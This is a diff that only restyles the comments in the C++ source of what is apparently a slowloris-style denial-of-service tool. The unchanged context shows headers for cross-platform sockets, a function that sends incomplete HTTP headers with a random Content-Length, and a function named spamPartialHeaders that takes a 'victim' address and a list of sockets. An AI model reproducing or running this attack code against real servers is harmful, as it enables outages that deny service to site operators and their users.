@@ -2,20 +2,20 @@
  * Not sure how well this'll work so far on Windows and Linux as it's yet to be tested. In theory, it should work fine due to kernel checks and lib substitution. It throws no errors on Windows currently.
  */
 
-#include <iostream> // For I/O
-#include <string> // For string manipulation 
+#include <iostream> //For I/O.
+#include <string> //For string manipulation. 
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/types.h> //Socket attrivutes/multi-threading
-#include <cstring> // Get strlen() to get length of string
-#include <vector> // Manipulatable arrays
-#include <thread> // For thread handling
-#include <chrono> // For cross-platform thread sleeping
+#include <sys/types.h> //Socket attrivutes/multi-threading.
+#include <cstring> //Get strlen() to get length of string.
+#include <vector> //Manipulatable arrays.
+#include <thread> //For thread handling.
+#include <chrono> //For cross-platform thread sleeping.
 
 #ifdef _WIN32 //This allows us to substitute Linux headers for Windows ones without having to deal with separate applications.
-#include <WinSock2.h> //substitute for Linux socket headers
-#include <ws2tcpip.h> // for inet_pton()
-#pragma comment(lib, "Ws2_32.lib") // Resolves annoying Linker errors.
+#include <WinSock2.h> //Substitute for Linux socket headers.
+#include <ws2tcpip.h> //For inet_pton().
+#pragma comment(lib, "Ws2_32.lib") //Resolves annoying Linker errors.
 #else //Linux headers.
 #include <sys/socket.h> //Socket defined here.
 #include <arpa/inet.h> //Parses IP addresses into network readable.
@@ -36,7 +36,7 @@ void initialSendSocket(int socketNum)
 	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
 	sprintf(incompleteHeader, "Content-Length: %d\r\n", (rand() % 99999 + 1000));
 	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
-#pragma warning(default: 4996) //restore warnings back to usual as we don't want to miss any other possible 4496's
+#pragma warning(default: 4996) //Restore warnings back to usual as we don't want to miss any other possible 4496's.
 }
 
 void spamPartialHeaders(struct sockaddr_in victim, std::vector<int> socketList, int totalSockets)
